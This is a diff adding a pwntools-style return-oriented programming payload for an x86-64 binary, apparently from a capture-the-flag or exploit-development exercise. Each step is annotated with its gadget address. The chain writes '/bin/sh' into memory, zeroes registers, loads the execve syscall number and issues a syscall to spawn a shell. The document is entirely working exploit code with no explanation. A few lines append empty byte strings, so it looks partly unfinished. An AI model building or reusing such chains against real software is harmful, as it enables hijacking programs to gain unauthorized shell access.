@@ -1,0 +1,21 @@
+payload = p64(0x410c41)
+#0x0000000000410c41: pop rax; ret; 
+payload += p64(0x4b1030)+p64(0x41041f)
+# 0x000000000041041f: pop rdx; ret; 
+payload += p64(0x68662f6e69622f)+p64(0x489a5c)
+# 0x0000000000489a5c: mov qword ptr [rax + 0x40], rdx; ret; 
+payload += p64(0x442504)
+# 0x0000000000442504: xor esi, esi; mov eax, esi; ret; 
+payload += p64(0x410c41)
+# 0x0000000000410c41: pop rax; ret; 
+payload += p64(0x4b1070)+p64(0x41041f)
+# 0x000000000041041f: pop rdx; ret; 
+payload += p64(0x4410b4)+p64(0x413622)
+# 0x0000000000413622: mov edi, eax; jmp rdx; 
+payload += b''
+# 0x00000000004410b4: xor edx, edx; sub eax, edx; ret; 
+payload += p64(0x410c41)
+# 0x0000000000410c41: pop rax; ret; 
+payload += p64(0x3b)+p64(0x450f8f)
+# 0x0000000000450f8f: syscall; 
+payload += b''
